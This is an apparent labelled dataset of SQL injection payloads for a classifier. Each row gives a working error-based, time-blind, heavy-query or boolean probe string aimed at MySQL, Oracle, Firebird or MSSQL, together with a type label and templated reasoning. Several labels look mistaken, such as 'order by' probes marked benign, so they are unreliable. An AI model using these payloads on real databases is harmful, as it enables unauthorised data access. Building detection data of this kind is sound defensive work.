id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18344,"1 ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",error_based,mysql,0.8,"Payload contains token 'extractvalue', 'benchmark' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.",2
18345,"1 where 5929 = 5929 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18346,"1 ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 5468 = 5468",heavy_query,firebird,0.7,Payload contains token 'count(*) from 4 tables' → maps to heavy_query per priority table; DB signature → firebird. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18347,1' ) where 6244 = 6244 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,time_blind,mysql,0.7,Payload contains token 'sleep(' → maps to time_blind per priority table; DB signature → mysql. Time-based blind injection (P5): the function induces measurable delay for inference.,1
18348,-1765' ) order by 1--,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",3
18349,1'+ ( select qdon where 9453 = 9453,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18350,"1"" and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",boolean_blind,mysql,0.8,Payload contains token 'elt(' → maps to boolean_blind per priority table; DB signature → mysql. Boolean-based blind (P3): tautology/regex/elt branches yield true/false used to infer bits.,2
18351,"1%"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ""%"" = """,error_based,mysql,0.7,Payload contains token 'updatexml' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18352,"1%"" and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.7,Payload contains token 'count(*) from 7 tables' → maps to heavy_query per priority table; DB signature → generic. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18353,-1277' ) ) ) order by 1--,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",3
